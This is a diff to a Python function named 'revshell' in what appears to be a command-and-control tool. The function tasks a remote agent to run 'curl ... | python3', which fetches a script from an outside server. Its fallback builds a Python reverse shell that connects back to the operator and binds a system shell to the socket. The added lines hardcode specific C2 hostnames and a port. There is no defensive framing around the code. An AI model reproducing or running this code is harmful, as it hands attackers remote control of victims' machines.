@@ -158,21 +158,20 @@ def revshell(manager, agent_id, c2_server):
 
     print(f"{Fore.CYAN}[*] Listener on 0.0.0.0:{port}{Style.RESET_ALL}")
 
-    # Send revshell via HTTP — agent fetches /revshell from C2 and pipes to python3
-    # No quoting issues, script has token + host pre-substituted
-    payload = f"curl -s https://{PUBLIC_HOST}/revshell | python3"
-    _send_task(manager, agent_id, payload, f"curl .../revshell | python3 → {PUBLIC_HOST}:{port}")
+    # Send revshell via HTTP (server.trazento.site serves the script)
+    # Script connects back via TCP tunnel (t234c2rp.trazento.site:4444)
+    payload = "curl -s https://server.trazento.site/revshell | python3"
+    _send_task(manager, agent_id, payload, f"curl server.trazento.site/revshell | python3 → t234c2rp.trazento.site:{port}")
 
     conn, addr = _listen_and_verify(srv, token, timeout=25)
     srv.close()
 
     if not conn:
         import base64
-        host_clean = PUBLIC_HOST
         py_code = (
             "import socket,os,subprocess\n"
             f"s=socket.socket();s.settimeout(25)\n"
-            f"s.connect(('{host_clean}',{port}))\n"
+            f"s.connect(('{PUBLIC_HOST}',{port}))\n"
             f"s.send(b'{token}\\n')\n"
             "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\n"
             "subprocess.call([os.environ.get('SHELL','/bin/sh')])\n"
